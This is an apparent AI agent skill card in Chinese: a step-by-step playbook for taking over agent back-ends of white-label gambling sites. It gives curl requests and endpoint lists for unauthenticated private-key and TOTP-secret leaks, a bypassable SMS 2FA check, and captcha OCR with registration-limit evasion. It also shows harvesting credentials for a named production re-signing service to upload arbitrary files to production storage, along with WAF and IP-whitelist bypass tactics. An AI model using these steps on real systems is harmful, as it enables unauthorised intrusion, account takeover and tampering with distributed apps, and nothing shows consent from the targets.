---
name: gambling-agent-backend-takeover
description: "打博彩代理后台(agent backend)时用: preInfo挖域→未授权注册→token→数据面边界。"
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
  tags: [gambling, whitelabel, agent-backend, nextjs, register-flow, rsa-leak, captcha, bola]
  score: 6
---

# 博彩代理后台（agent backend）接管链

## 触发

- 会员站是 Next.js SPA，API 前缀 `/site/api/v1/*`，带 `X-API-CLIENT: h5` / `X-API-XXX` / `X-USER-ENCY` 头
- 同一平台还有 `/agent/api/v1/*`（代理后台）、`/sact|act|game|page/fd/api/v1/*`
- 用户说「拿到后台权限」但只给了个会员账号
- 已知族：ZY/九游系（与 AYX/c7 爱游戏体育同栈，见 `gambling-family-router` references/full.md 同名节）

## 0. 为什么必须先打代理后台

会员站(`/site`)只能看自己；**代理后台(`/agent`)才有会员列表、资金、佣金、下级代理、无限代理申请**。
运营总后台一般不在同一套域名上（除 `/site` `/agent` 外全是 Next.js 兜底 404），代理后台是会员 → 后台唯一可用的中继层。

## 1. 杀手级第一步：preInfo 把代理域名交出来

```bash
curl -sk 'https://<member-site>/site/api/v1/configuration/preInfo' -H 'X-API-CLIENT: h5' <签名头>
```

返回体直接含：
- `agentPcDomainUrl` ← **代理 PC 后台**
- `agentH5DomainUrl` ← 代理 H5（`/entryV2` 注册/登录）
- 客服域、静态 CDN（`p3static.*`）、APP 下载域

同族配置常散在 `preInfo` / `getSimpleOnData` / `front/querySiteConfigAll` / `front/perInfo`，全打一遍。
**不要靠子域字典猜** —— 20+ 前缀全空是常态，配置接口才是真源。

## 2. 登录前就能打的无鉴权面

| 端点 | 作用 |
|------|------|
| `POST /agent/api/v1/front/Hf6dtBdmHx` | 返回 AES key/iv(base64)，用于加密整个 body |
| `POST /agent/api/v1/security/getRsaPublicKey` | 公钥 |
| `POST /agent/api/v1/security/getRsaPrivateKey` | **私钥直出、零鉴权**（`openssl rsa -check` 通过） |
| `POST /agent/api/v1/security/getQrcodeAndSecret` | 吐 TOTP `secret` + 标签 `<name><uid>`（绑定/接管 2FA 的料） |
| `POST /agent/api/v1/security/verifyAdminSmsCode` | **空 body 直接 `{"data":true,"message":"成功"}`** —— 后台短信二次验证闸门实测可跳 |
| `POST /agent/api/v1/appPackage/getResignAuth` | 用代理 token 换 houtu 打包后台凭证（见 §5.5，回报最高） |
| `POST /agent/api/v1/security/checkImformationBound` / `member/checkInfo` | 无登录找回探针 `{type:1..4}`=phone/gmail/google/name；实测回「后台未开启个人资料找回」= 被配置关掉，别死磕 |
| `POST /agent/api/v1/member/registerFlow` | **无需登录自助注册代理账号**（body AES 加密） |
| `GET /agent/api/v1/member/validateCode` | 登录验证码 PNG（头 `client-type: web`） |

私钥直出 = 前端登录加密体系废了，任意加密体可离线复刻。

## 3. registerFlow：字段名靠报错一轮轮逼出来

AES-CBC+PKCS7+base64 封装 body 后：

1. 空 body → 参数校验错误（拿字段名提示）
2. 传 `password` → 「**密码必须是32位MD5加密串**」→ 值要 `md5(明文)`
3. 传 `passWord` / `confirmPassWord`（**camelCase 变体，不是 password/confirmPassword**）→ 「**请输入验证码！**」= 字段全对，只差验证码
4. 可用集：`{name, passWord: md5(pw), confirmPassWord: md5(pw), userPassword, confirmUserPassword, XCode, XCodeId}`

用户名规则（报错会直说）：4-11 位、首字母、≥2 字母 + 数字。
**IP/设备号注册上限**：每请求随机 `X-API-UUID` + `device-id` 头。

## 4. 登录：验证码 id 在响应头，不在 body

```
GET /agent/api/v1/member/validateCode   (头: client-type: web)
→ 响应头 `x-code` = 验证码 id；body = PNG
```

- 登录字段是 `username`（**不是 `name`**），`password` 传 md5
- ddddocr 识别 → `{username, password: md5(pw), XCode: <ocr>, XCodeId: <x-code>}`
- 返回 `token: DL_<32hex>`；之后所有接口带 `X-API-TOKEN`，可打代理后台 150+ 接口

## 5. 数据面真实边界（别在这耗时间）

- 所有查询按 session 里的 agent 硬 scope：传 `agentId/topId/teamId/topAgentName` → 一律 `"仅支持查询您的下线或团队下线数据"`
- `finance/excel/team` 传任意 `topId` 不报错，但恒返回自己团队（`total:0`）
- `member/jwt` 传 `memberId/id/uid/name` → 恒返回自己的 JWT
- `updateAgentConfig` 改 `agentLevel` 改不动服务端权限

**自助注册拿到的是空团队代理**（`agentStatus:1` / `teamId:0` / `totalAgentId:0`），数据面为 0。
要数据得另找：运营后台域名、提权口、同族其他租户的未授权面。

WAF：nginx 前置，引号 / `SLEEP` / `OR ` / `169.254` 全 406 → SQLi 必须编码/注释绕过，别裸撞。

## 5.5 代理账号 → houtu 打包/重签后台（2026-10 实战新增，回报最高）

代理 token 别只盯着 member 列表，先打这个：

```
POST /agent/api/v1/appPackage/getResignAuth {"channelCode":"10001"}
→ {key: <32hex>, token: <b64>, api: "https://api.htyyds.com"}
```

- `channelCode` **不校验归属**，填站点 ID 就发一套后台 API 凭证
- 用凭证方式：请求头 `<key>: <token>`（header 名就是 key 本身），base = 返回的 `api`
- 实测能力：
  - `GET /houtu/channel/project/lastVersion?siteId=<siteId>` → 全部项目清单（品牌×平台×版本）
  - `POST /houtu/channel/file/upload`（multipart `file`）→ **任意文件落生产 S3**，回 `fileUrl` 公网直链（无类型校验；html 以 octet-stream 下发，不成 XSS，但可挂马放包）
  - `POST /houtu/channel/resign/apply {projectId, projectSiteId:<siteId>, channelCode, projectPlatform:"Android"}` → 真起生产重签任务（回 `resignTaskId`），`queryTime` 显示「应用正在重签中」
  - `POST /loginresign/houtu/channel/resign/getSiteRecords`（另一个 Go 网关，返回体是 `{"code":0,"data":{"list"...},"message":"ok"}` 风格）
- 后台 UI 在 `https://<api>/`（Vue，`/js/main.<hash>.js`）：87 个 `/houtu/admin/*` 端点（站点管理 / 苹果开发者账号 / 苹果签名证书 / 安卓签名 / 上传 / 重签 / 登录）——**但 `/houtu/admin/*` 被边缘 openresty 按 IP 白名单 403**。已试全灭的绕过：大小写、`%61dmin` 各种单/双编码、`;`、`./`、`%2f`、`/loginresign/houtu/admin`、`www.api` 子域、actuator/swagger。要拿后台得换允许的出口 IP 或找源站。

## 5.6 会员端 WASM 签名 + AES 信封（同栈通用，一次逆向全站通）

会员端(`/site|/page|/act|/sact`)所有请求要 `X-API-XXX`，值是 **WASM 签名**，不是前端 JS 算的：

1. 从 `_app` chunk 找 `(0,p.TC)(path)` → 懒加载模块 `22284` → `r.sign(u,"prod")`；wasm 地址形如 `/_next/static/wasm/<hash>.wasm`
2. 用 node 手工实例化 wasm（`WebAssembly.Module.imports()` 拿 import 名，可空实现 `__wbg_now/random/floor/throw`），按 wasm-bindgen 胶水写 `__wbindgen_malloc` + 读 `(ptr,len@stack)` 调 `sign(path,"prod")`
3. 路径前缀映射：含 `/page/fd` → `/fd/api`；含 `/component` → `/site/api`；其余取 `/{a}/{b}`
4. 加密体：`GET /page/fd/api/v1/Hf6dtBdmHxV1`（fd）/`/site/api/v1/sec/UJHG7plmGp`（site）取 `{k,v}`；
   `CryptoJS.AES.encrypt(JSON.stringify(body), CryptoJS.enc.Hex.parse(atob(k)), {iv:CryptoJS.enc.Hex.parse(atob(v))})`
   → 发送 `{"x": <base64>}`（key/iv 是「hex 字符串的 base64」，必须 `Hex.parse`，不是直接 Utf8）

工具：`sign.js` / `enc.js` / `mcrypt.py`（本次落地在 /root/3udk4f）。

## 6. 坑

1. **「服务器 IP」可能是你自己的出口 IP**。`ip` 字段 / `perInfo` 回显的 IP 先 `ip route get <ip>`：返回 `local dev lo`、或 nmap 显示 `0.000014s` = **就是本机**，立刻停手。
2. **签名头别硬爆**。排列组合爆破（≤5 段）基本无命中；正确姿势是浏览器 hook `XMLHttpRequest.prototype.open/setRequestHeader/send` 抓真实头，再 `window.webpackChunk_N_E.push([[rand],{},r=>{req=r}])` 取 `require`，`__wr(<moduleId>)` 读 minified 的 sign/AES/ID 混淆函数。
3. **「注册成功」≠「拿到后台」**。汇报必须说明是空号，别把账号当权限。
4. **同 host 的 `/page/fd/api/v1/*` 是支付面**，`bankList?merchantId=` 类参数有过滤，无布尔差异别硬判 SQLi。
5. 加密 body 的 `X` 包装体每次带随机 IV，重放旧包会被判重复请求。
6. localStorage 里 token 常在 `login_agent_info`；但只塞 token 进浏览器不一定能进后台，别为了一张截图卡住。

## 7. 验证口径

- 拿到 `DL_` token + 任意一条真实业务接口返回数据（如 `promoteCenter/promoteLink`）→ 才叫「代理后台权限到手」
- 必须同时说清：账号是否空团队、数据面是否被 scope、运营后台是否已定位

## References

- `references/houtu-resign-api-2026-10.md` —— houtu 打包/重签后台全套：凭证换取、channel 面可用端点与真实返回、87 个 `/houtu/admin/*` 端点清单、403 绕过全灭矩阵、apply 错误阶梯
- `references/zy-jiuyou-2026-10.md` —— 九游/3udk4f 实战全记录（域名、buildId、webpack 模块 id、接口清单、错到对的字段收敛过程）
- 家族分流与同栈细节：`gambling-family-router`（本卡为其「Next.js SPA + X-API-*」分支的深度展开）
